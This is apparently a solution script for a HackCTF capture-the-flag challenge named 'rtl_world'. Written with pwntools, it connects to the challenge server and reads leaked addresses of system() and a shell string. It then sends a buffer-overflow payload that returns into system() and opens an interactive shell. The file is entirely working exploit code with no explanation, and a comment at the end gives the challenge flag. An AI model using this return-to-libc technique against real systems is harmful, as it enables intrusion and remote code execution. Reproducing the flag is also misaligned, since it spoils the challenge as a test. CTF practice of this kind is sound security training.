from pwn import *
#32bit binary
#input 2 and 4, make a lot of money. 
#p = process("./rtl_world")
p = remote("ctf.j0n9hyun.xyz",3010)

p.sendlineafter(">>> ","2 4")

p.sendlineafter(">>> ","1")
p.recvuntil("Binary Boss live in ")
rcv1 = int(p.recv(10),16)

p.sendlineafter(">>> ","3")
p.recvuntil("System Armor : ")
system = int(p.recv(10),16)

p.sendlineafter(">>> ","4")
p.recvuntil("Shell Sword : ")
bin = int(p.recv(10),16)

log.info("1: "+hex(rcv1)+"\nsystem: "+hex(system)+"\nbin: "+hex(bin))
pause()
payload = "a"*0x90+p32(system)+"b"*4+p32(bin)
p.sendlineafter(">>> ","5")
p.sendlineafter("[Attack] > ",payload)


p.interactive()

#HackCTF{17_w45_4_6r347_r7l_w0rld}
